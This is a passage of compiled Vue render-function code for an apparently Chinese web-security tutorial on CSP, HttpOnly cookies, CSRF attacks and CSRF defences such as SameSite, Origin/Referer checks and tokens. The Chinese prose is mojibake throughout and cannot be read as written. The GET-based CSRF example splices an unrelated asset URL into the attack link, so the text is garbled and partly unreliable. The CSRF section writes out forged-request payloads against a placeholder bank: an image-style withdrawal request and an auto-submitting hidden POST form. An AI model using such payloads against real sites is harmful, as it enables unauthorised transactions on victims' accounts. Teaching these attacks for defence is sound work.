punctuation"}},[t._v("<")]),t._v("meta")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("http-equiv")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("Content-Security-Policy"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("content")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("default-src 'self'; img-src https://*;"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("/>")])]),t._v("\n")])])]),a("p",[a("code",[t._v("default-src 'self'")]),t._v("ï¼šæ‰€æœ‰èµ„æºå†…å®¹å‡æ¥è‡ªç«™ç‚¹çš„åŒä¸€ä¸ªæº (ä¸åŒ…æ‹¬å…¶å­åŸŸå)")]),t._v(" "),a("p",[a("code",[t._v("img-src https://*;")]),t._v("ï¼šå›¾ç‰‡å¯ä»¥é€šè¿‡ HTTPS æ–¹å¼ä»ä»»ä½•åœ°æ–¹åŠ è½½(æ³¨æ„ "),a("code",[t._v("\\*")]),t._v(" é€šé…ç¬¦)ã€‚ï¼ˆç±»ä¼¼çš„æœ‰"),a("code",[t._v("script-src")]),t._v("ã€"),a("code",[t._v("style-src")]),t._v("ã€"),a("code",[t._v("img-src")]),t._v("ï¼‰")]),t._v(" "),a("p",[a("code",[t._v("connect-src")]),t._v("ï¼šé™åˆ¶é€šè¿‡è„šæœ¬æ¥å£åŠ è½½çš„é“¾æ¥åœ°å€ã€‚")]),t._v(" "),a("h4",{attrs:{id:"httponly-cookie"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#httponly-cookie"}},[t._v("#")]),t._v(" httpOnly Cookie")]),t._v(" "),a("p",[t._v("HttpOnly æ˜¯ä¸€ä¸ªè®¾ç½® cookie æ˜¯å¦å¯ä»¥è¢« javasript è„šæœ¬è¯»å–çš„å±æ€§ï¼Œæµè§ˆå™¨å°†ç¦æ­¢é¡µé¢çš„ Javascript è®¿é—®å¸¦æœ‰ HttpOnly å±æ€§çš„ Cookieã€‚")]),t._v(" "),a("p",[a("strong",[t._v("ç¦æ­¢ JavaScript è¯»å–æŸäº›æ•æ„Ÿ Cookieï¼Œä¸æ˜¯é¢„é˜² XSS çš„æªæ–½ï¼Œæ˜¯é­åˆ° XSS åï¼Œé¢„é˜²æ³„æ¼ç”¨æˆ·æ•æ„Ÿä¿¡æ¯çš„æªæ–½ã€‚")])]),t._v(" "),a("div",{staticClass:"language-js extra-class"},[a("pre",{pre:!0,attrs:{class:"language-js"}},[a("code",[t._v("response"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("setHeader")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"Set-Cookie"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"token=zkskskdngqkkkgn245tkdkgj;HttpOnly"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n")])])]),t._v(" "),a("p",[t._v("å…³äº Cookie çš„æ›´å¤šå»¶å±•ï¼Œæˆ³"),a("a",{attrs:{href:"/articles/Browser/è¾“å…¥%20URL%20åˆ°å±•ç¤ºé¡µé¢çš„è¿‡ç¨‹.html#_4-6-å…³äº-cookie"}},[t._v("å…³äº Cookie")])]),t._v(" "),a("h2",{attrs:{id:"csrf-æ”»å‡»"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#csrf-æ”»å‡»"}},[t._v("#")]),t._v(" CSRF æ”»å‡»")]),t._v(" "),a("h3",{attrs:{id:"ä»€ä¹ˆæ˜¯-csrf-æ”»å‡»"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#ä»€ä¹ˆæ˜¯-csrf-æ”»å‡»"}},[t._v("#")]),t._v(" ä»€ä¹ˆæ˜¯ CSRF æ”»å‡»ï¼Ÿ")]),t._v(" "),a("p",[t._v("Cross Site Request Forgery è·¨ç«™è¯·æ±‚ä¼ªé€ ")]),t._v(" "),a("p",[t._v("åœ¨å—å®³è€…ç™»å½•äº† A ç½‘ç«™ä»¥åï¼Œè¯±æƒ‘å—å®³è€…è¿›å…¥ç¬¬ä¸‰æ–¹ç½‘ç«™ï¼Œåœ¨ç¬¬ä¸‰æ–¹ç½‘ç«™åˆ©ç”¨å—å®³è€…åœ¨ A ç½‘ç«™çš„ç™»å½•å‡­è¯ï¼ˆè¯·æ±‚æºå¸¦ cookieï¼‰ï¼Œå†’å……ç”¨æˆ·æ“ä½œï¼Œå‘å¯¹ A ç½‘ç«™å‘é€è·¨ç«™è¯·æ±‚è¿›è¡ŒæŸé¡¹æ“ä½œã€‚")]),t._v(" "),a("p",[t._v("ä¾‹å­ï¼šç™»å½•é‚®ç®±ç‚¹å¼€ä¸çŸ¥åç¬¬ä¸‰æ–¹é‚®ä»¶ï¼Œè·³è½¬è‡³ç¬¬ä¸‰æ–¹é¡µé¢ï¼Œç¬¬ä¸‰æ–¹é¡µé¢é…ç½®é‚®ä»¶è½¬å‘è§„åˆ™è·å–ç™»å½•äººé‚®ä»¶ï¼Œçªƒå–ä¿¡æ¯ã€‚")]),t._v(" "),a("p",[t._v("CSRF æ”»å‡»å¹¶ä¸éœ€è¦å°†æ¶æ„ä»£ç æ³¨å…¥ç”¨æˆ·å½“å‰é¡µé¢çš„ html æ–‡æ¡£ä¸­ï¼Œè€Œæ˜¯è·³è½¬åˆ°æ–°çš„é¡µé¢ï¼Œåˆ©ç”¨æœåŠ¡å™¨çš„éªŒè¯æ¼æ´å’Œç”¨æˆ·ä¹‹å‰çš„ç™»å½•çŠ¶æ€æ¥æ¨¡æ‹Ÿç”¨æˆ·è¿›è¡Œæ“ä½œã€‚")]),t._v(" "),a("p",[t._v("ä¸€ä¸ªå…¸å‹çš„ CSRF æ”»å‡»æœ‰ç€å¦‚ä¸‹çš„æµç¨‹ï¼š")]),t._v(" "),a("ol",[a("li",[t._v("å—å®³è€…ç™»å½• a.comï¼Œå¹¶ä¿ç•™äº†ç™»å½•å‡­è¯ï¼ˆCookieï¼‰ã€‚")]),t._v(" "),a("li",[t._v("æ”»å‡»è€…å¼•è¯±å—å®³è€…è®¿é—®äº† b.comã€‚")]),t._v(" "),a("li",[t._v("b.com å‘ a.com å‘é€äº†ä¸€ä¸ªè¯·æ±‚ï¼ša.com/act=xxã€‚æµè§ˆå™¨ä¼šé»˜è®¤æºå¸¦ a.com çš„ Cookieã€‚")]),t._v(" "),a("li",[t._v("a.com æ¥æ”¶åˆ°è¯·æ±‚åï¼Œå¯¹è¯·æ±‚è¿›è¡ŒéªŒè¯ï¼Œå¹¶ç¡®è®¤æ˜¯å—å®³è€…çš„å‡­è¯ï¼Œè¯¯ä»¥ä¸ºæ˜¯å—å®³è€…è‡ªå·±å‘é€çš„è¯·æ±‚ã€‚")]),t._v(" "),a("li",[t._v("a.com ä»¥å—å®³è€…çš„åä¹‰æ‰§è¡Œäº† act=xxã€‚")]),t._v(" "),a("li",[t._v("æ”»å‡»å®Œæˆï¼Œæ”»å‡»è€…åœ¨å—å®³è€…ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹ï¼Œå†’å……å—å®³è€…ï¼Œè®© a.com æ‰§è¡Œäº†è‡ªå·±å®šä¹‰çš„æ“ä½œã€‚")])]),t._v(" "),a("h3",{attrs:{id:"csrf-æ”»å‡»ç±»å‹"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#csrf-æ”»å‡»ç±»å‹"}},[t._v("#")]),t._v(" CSRF æ”»å‡»ç±»å‹")]),t._v(" "),a("h5",{attrs:{id:"get-ç±»å‹çš„-csrf"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#get-ç±»å‹çš„-csrf"}},[t._v("#")]),t._v(" GET ç±»å‹çš„ CSRF")]),t._v(" "),a("p",[t._v("è·³è½¬åˆ°ç¬¬ä¸‰æ–¹ç½‘ç«™åï¼Œè‡ªåŠ¨å‘é€ä¸€ä¸ª GET çš„ HTTP è¯·æ±‚ã€‚")]),t._v(" "),a("p",[t._v("GET ç±»å‹çš„ CSRF åˆ©ç”¨éå¸¸ç®€å•ï¼Œåªéœ€è¦ä¸€ä¸ª HTTP è¯·æ±‚ï¼Œä¸€èˆ¬ä¼šè¿™æ ·åˆ©ç”¨ï¼š")]),t._v(" "),a("div",{staticClass:"language-js extra-class"},[a("pre",{pre:!0,attrs:{class:"language-js"}},[a("code",[t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("!")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("https"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("awps"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("assets"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("meituan"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("net"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("mit"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("x"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("blog"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("images"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("bundle"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("2018b"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("ff0cdbee"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("example"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("withdraw"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("?")]),t._v("amount"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("10000")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("&")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("for")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("hacker"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])])]),a("p",[t._v("åœ¨å—å®³è€…è®¿é—®å«æœ‰è¿™ä¸ª img çš„é¡µé¢åï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨å‘"),a("code",[t._v("http://bank.example/withdraw?account=xiaoming&amount=10000&for=hacker")]),t._v("å‘å‡ºä¸€æ¬¡ HTTP è¯·æ±‚ã€‚")]),t._v(" "),a("p",[t._v("bank.example å°±ä¼šæ”¶åˆ°åŒ…å«å—å®³è€…ç™»å½•ä¿¡æ¯çš„ä¸€æ¬¡è·¨åŸŸè¯·æ±‚ã€‚")]),t._v(" "),a("h4",{attrs:{id:"è¯·æ±‚-post-ç±»å‹çš„-csrf"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#è¯·æ±‚-post-ç±»å‹çš„-csrf"}},[t._v("#")]),t._v(" è¯·æ±‚ POST ç±»å‹çš„ CSRF")]),t._v(" "),a("p",[t._v("è·³è½¬åˆ°ç¬¬ä¸‰æ–¹ç½‘ç«™åï¼Œè‡ªåŠ¨æäº¤è¡¨å•ã€‚")]),t._v(" "),a("div",{staticClass:"language-html extra-class"},[a("pre",{pre:!0,attrs:{class:"language-html"}},[a("code",[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("form")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("action")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("http://bank.example/withdraw"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("method")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("POST"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("input")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("type")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("hidden"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("name")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("account"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("value")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("xiaoming"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("/>")])]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("input")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("type")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("hidden"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("name")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("amount"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("value")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("10000"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("/>")])]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("input")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("type")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("hidden"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("name")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("for"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("value")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("hacker"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("/>")])]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("form")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("script")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),a("span",{pre:!0,attrs:{class:"token script"}},[a("span",{pre:!0,attrs:{class:"token language-javascript"}},[t._v("\n    document"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("forms"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("submit")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n")])]),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("script")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])])]),a("h4",{attrs:{id:"é“¾æ¥ç±»å‹çš„-csrf"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#é“¾æ¥ç±»å‹çš„-csrf"}},[t._v("#")]),t._v(" é“¾æ¥ç±»å‹çš„ CSRF")]),t._v(" "),a("p",[t._v("éœ€è¦ç”¨æˆ·åœ¨ç¬¬ä¸‰æ–¹ç½‘ç«™ç‚¹å‡»é“¾æ¥è§¦å‘ï¼Œç„¶åå‘é€ä¸€ä¸ª GET è¯·æ±‚ã€‚")]),t._v(" "),a("h3",{attrs:{id:"å¦‚ä½•é¢„é˜²-csrf-æ”»å‡»"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#å¦‚ä½•é¢„é˜²-csrf-æ”»å‡»"}},[t._v("#")]),t._v(" å¦‚ä½•é¢„é˜² CSRF æ”»å‡»")]),t._v(" "),a("p",[t._v("CSRF æ ¸å¿ƒï¼š")]),t._v(" "),a("ol",[a("li",[t._v("CSRF é€šå¸¸å‘ç”Ÿåœ¨ç¬¬ä¸‰æ–¹ç½‘ç«™ï¼Œæ˜¯è·¨ç«™çš„ï¼Œå†’å……ç”¨æˆ·è¿›è¡Œè¯·æ±‚ï¼›")]),t._v(" "),a("li",[t._v("CSRF æ”»å‡»è€…ä¸èƒ½è·å–åˆ° Cookie ç­‰ä¿¡æ¯ï¼Œåªæ˜¯å†’ç”¨ã€‚ï¼ˆcookie ç¼“å­˜åœ¨å®¢æˆ·ç«¯ï¼Œæ¯ä¸ª cookie å¤§å°ä¸è¶… 4kbï¼Œæ¯æ¬¡è®¿é—®ç›¸åŒç½‘ç«™å®¢æˆ·ç«¯ä¼šè‡ªåŠ¨é™„å¸¦ä¸Šï¼‰")])]),t._v(" "),a("p",[t._v("CSRF æ”»å‡»çš„æ ¸å¿ƒæ˜¯ä¼ªé€ è¯·æ±‚ï¼Œè¯†åˆ«è¿™ç§çš„æ”»å‡»çš„é‡ç‚¹å°±æ˜¯åˆ¤æ–­å½“å‰æ“ä½œæ˜¯å¦ä¼ªé€ ã€‚")]),t._v(" "),a("p",[t._v("é¢„é˜²æ ¸å¿ƒï¼š")]),t._v(" "),a("ol",[a("li",[t._v("é˜»æ­¢ä¸æ˜å¤–åŸŸçš„è®¿é—®ï¼šæ¥æºæ£€æµ‹ï¼ˆoriginã€refererï¼‰")]),t._v(" "),a("li",[t._v("æäº¤æ—¶è¦æ±‚é™„åŠ æœ¬åŸŸæ‰èƒ½è·å–çš„ä¿¡æ¯ï¼ˆSameSite/Tokenï¼‰")])]),t._v(" "),a("h5",{attrs:{id:"samesite-cookie-å±æ€§"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#samesite-cookie-å±æ€§"}},[t._v("#")]),t._v(" Samesiteï¼ˆCookie å±æ€§ï¼‰")]),t._v(" "),a("p",[t._v("CSRF æ”»å‡»ä¸­é‡è¦çš„ä¸€ç¯å°±æ˜¯è‡ªåŠ¨å‘é€ç›®æ ‡ç«™ç‚¹ä¸‹çš„ Cookieï¼Œå› æ­¤å¯¹ Cookie çš„é˜²èŒƒå°¤ä¸ºé‡è¦ã€‚")]),t._v(" "),a("ol",[a("li",[a("p",[t._v("Samesite=strictï¼š"),a("br"),t._v("\nä»»ä½•æƒ…å†µä¸‹éƒ½ä¸å¯ä½œä¸ºç¬¬ä¸‰æ–¹ Cookie ä¼ ç»™æœåŠ¡å™¨")])]),t._v(" "),a("li",[a("p",[t._v("Samesite=laxï¼š"),a("br"),t._v("\nå…è®¸å‘é€å®‰å…¨ HTTP æ–¹æ³•å¸¦ä¸Š Cookieï¼Œå¦‚ "),a("code",[t._v("Get")]),t._v(" / "),a("code",[t._v("OPTIONS")]),t._v(" ã€"),a("code",[t._v("HEAD")]),t._v(" è¯·æ±‚ï¼›get æ–¹æ³• / href å±æ€§ / a æ ‡ç­¾å‘é€ get è¯·æ±‚çš„æƒ…å†µä¸‹å¯ä»¥æºå¸¦ Cookieï¼Œå…¶ä»–æƒ…å†µå‡ä¸èƒ½ã€‚ï¼ˆä¿è¯é¡µé¢çš„å¹‚ç­‰æ€§ï¼Œåç«¯æ¥å£ä¸è¦åœ¨ GET é¡µé¢ä¸­åšç”¨æˆ·æ“ä½œï¼‰")])]),t._v(" "),a("li",[a("p",[t._v("Samesite=noneï¼šé»˜è®¤æ¨¡å¼ï¼Œè¯·æ±‚ä¼šè‡ªåŠ¨æºå¸¦ä¸Š Cookieã€‚(Chrome 80 ç‰ˆæœ¬å Lax ä¸ºé»˜è®¤å€¼)")])])]),t._v(" "),a("h4",{attrs:{id:"æ¥æºæ£€æµ‹"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#æ¥æºæ£€æµ‹"}},[t._v("#")]),t._v(" æ¥æºæ£€æµ‹")]),t._v(" "),a("ul",[a("li",[t._v("Origin")])]),t._v(" "),a("p",[t._v("Origin å­—æ®µå†…åŒ…å«è¯·æ±‚çš„åŸŸåï¼ˆä¸åŒ…å« path åŠ queryï¼‰")]),t._v(" "),a("p",[t._v("æ³¨æ„ï¼š302 é‡å®šå‘ä¹‹å Origin ä¸åŒ…å«åœ¨é‡å®šå‘çš„è¯·æ±‚ä¸­ï¼Œå› ä¸º Origin å¯èƒ½ä¼šè¢«è®¤ä¸ºæ˜¯å…¶ä»–æ¥æºçš„æ•æ„Ÿä¿¡æ¯ï¼Œie11 ä¸ä¼šåœ¨è·¨ç«™æ—¶å‘é€ Originã€‚")]),t._v(" "),a("ul",[a("li",[t._v("Referer")])]),t._v(" "),a("blockquote",[a("p",[t._v("å¯¹äº Ajax è¯·æ±‚ï¼Œå›¾ç‰‡å’Œ script ç­‰èµ„æºè¯·æ±‚ï¼ŒReferer ä¸ºå‘èµ·è¯·æ±‚çš„é¡µé¢åœ°å€ã€‚å¯¹äºé¡µé¢è·³è½¬ï¼ŒReferer ä¸ºæ‰“å¼€é¡µé¢å†å²è®°å½•çš„å‰ä¸€ä¸ªé¡µé¢åœ°å€ã€‚å› æ­¤æˆ‘ä»¬ä½¿ç”¨ Referer ä¸­é“¾æ¥çš„ Origin éƒ¨åˆ†å¯ä»¥å¾—çŸ¥è¯·æ±‚çš„æ¥æºåŸŸåã€‚")])]),t._v(" "),a("p",[t._v("Referer è®°å½•äº†è¯¥ HTTP è¯·æ±‚ï¼ˆreferrerï¼‰çš„æ¥æºåœ°å€ï¼ˆåŒ…å«å…·ä½“çš„ URL è·¯å¾„ï¼‰ï¼Œåœ¨éƒ¨åˆ†æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯ä»¥éšè—ï¼Œç”šè‡³ä¿®æ”¹è‡ªå·±è¯·æ±‚çš„ Refererã€‚å¹¶éç»å¯¹å®‰å…¨ã€‚")]),t._v(" "),a("p",[t._v("è®¾ç½® Referrer Policy çš„æ–¹æ³•æœ‰ä¸‰ç§ï¼š")]),t._v(" "),a("ol",[a("li",[t._v("åœ¨ CSP è®¾ç½®")]),t._v(" "),a("li",[t._v("é¡µé¢å¤´éƒ¨å¢åŠ  meta æ ‡ç­¾")]),t._v(" "),a("li",[t._v("a æ ‡ç­¾å¢åŠ  referrerpolicy å±æ€§")])]),t._v(" "),a("h4",{attrs:{id:"æäº¤è¦æ±‚é™„å¸¦æœ¬åŸŸä¿¡æ¯-csrf-token"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#æäº¤è¦æ±‚é™„å¸¦æœ¬åŸŸä¿¡æ¯-csrf-token"}},[t._v("#")]),t._v(" æäº¤è¦æ±‚é™„å¸¦æœ¬åŸŸä¿¡æ¯ï¼ˆCSRF-TOKENï¼‰")]),t._v(" "),a("ul",[a("li",[t._v("CSRF-TOKEN")])]),t._v(" "),a("p",[t._v("åŸç†ï¼šæœåŠ¡ç«¯åˆ©ç”¨ userId å’Œæ—¶é—´æˆ³ç”Ÿæˆä¸€ä¸ªè®¡ç®—ç»“æœ tokenï¼Œä¼ è¾“ç»™å‰ç«¯ï¼Œå‰ç«¯æ¥å—æ¯æ¬¡éƒ½å›ä¼ ç»™åç«¯ï¼Œè§£å¯†è¿›è¡Œæ ¡éªŒã€‚")]),t._v(" "),a("ul",[a("li",[t._v("éªŒè¯ç å¯†ç ")])]),t._v(" "),a("p",[t._v("åŒç† TOKEN")]),t._v(" "),a("ul",[a("li",[t._v("åŒé‡ COOKIE")])]),t._v(" "),a("p",[t._v("æµç¨‹ï¼š"),a("br"),t._v("\næ­¥éª¤ 1ï¼šåœ¨ç”¨æˆ·è®¿é—®ç½‘ç«™é¡µé¢æ—¶ï¼Œå‘è¯·æ±‚åŸŸåæ³¨å…¥ä¸€ä¸ª Cookieï¼Œå†…å®¹ä¸ºéšæœºå­—ç¬¦ä¸²ï¼ˆä¾‹å¦‚ csrfcookie=v8g9e4ksfhwï¼‰"),a("br"),t._v("\næ­¥éª¤ 2ï¼šåœ¨å‰ç«¯å‘åç«¯å‘èµ·è¯·æ±‚æ—¶ï¼Œå–å‡º Cookieï¼Œå¹¶æ·»åŠ åˆ° URL çš„å‚æ•°ä¸­ï¼ˆæ¥ä¸Šä¾‹ POST https://www.a.com/comment?csrfcookie=v8g9e4ksfhwï¼‰"),a("br"),t._v("\næ­¥éª¤ 3ï¼šåç«¯æ¥å£éªŒè¯ Cookie ä¸­çš„å­—æ®µä¸ URL å‚æ•°ä¸­çš„å­—æ®µæ˜¯å¦ä¸€è‡´ï¼Œä¸ä¸€è‡´åˆ™æ‹’ç»ã€‚")]),t._v(" "),a("p",[t._v("ä¼˜ç‚¹ï¼š"),a("br"),t._v("\næ— éœ€ä½¿ç”¨ Sessionï¼Œé€‚ç”¨é¢æ›´å¹¿ï¼Œæ˜“äºå®æ–½ã€‚"),a("br"),t._v("\nToken å‚¨å­˜äºå®¢æˆ·ç«¯ä¸­ï¼Œä¸ä¼šç»™æœåŠ¡å™¨å¸¦æ¥å‹åŠ›ã€‚"),a("br"),t._v("\nç›¸å¯¹äº Tokenï¼Œå®æ–½æˆæœ¬æ›´ä½ï¼Œå¯ä»¥åœ¨å‰åç«¯ç»Ÿä¸€æ‹¦æˆªæ ¡éªŒï¼Œè€Œä¸éœ€è¦ä¸€ä¸ªä¸ªæ¥å£å’Œé¡µé¢æ·»åŠ ã€‚")]),t._v(" "),a("p",[t._v("ç¼ºç‚¹ï¼š"),a("br"),t._v("\nCookie ä¸­å¢åŠ 